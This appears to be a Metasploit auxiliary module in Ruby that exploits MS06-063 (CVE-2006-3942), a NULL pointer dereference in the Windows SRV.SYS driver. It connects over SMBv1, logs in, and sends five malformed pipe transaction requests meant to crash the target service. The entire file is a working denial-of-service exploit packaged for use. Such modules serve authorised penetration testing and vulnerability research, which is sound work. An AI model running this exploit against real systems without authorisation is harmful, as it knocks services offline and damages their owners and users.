##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft SRV.SYS Pipe Transaction No Null',
        'Description' => %q{
          This module exploits a NULL pointer dereference flaw in the
          SRV.SYS driver of the Windows operating system. This bug was
          independently discovered by CORE Security and ISS.
        },

        'Author' => [ 'hdm' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['OSVDB', '27644' ],
          ['MSB', 'MS06-063' ],
          ['CVE', '2006-3942'],
          ['BID', '19215'],
        ],
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    deregister_options('SMB::ProtocolVersion')
  end

  def run
    print_status('Connecting to the target system...')

    connect(versions: [1])
    smb_login

    begin
      1.upto(5) do |i|
        print_status("Sending bad SMB transaction request #{i}...")
        simple.client.trans_nonull(
          "\\#{Rex::Text.rand_text_alphanumeric(1..16)}",
          '',
          Rex::Text.rand_text_alphanumeric(1..16),
          3,
          [1, 0, 1].pack('vvv'),
          true
        )
      end
    rescue ::Interrupt
      return
    rescue StandardError => e
      print_error("Error: #{e.class} > #{e}")
    end

    disconnect
  end
end
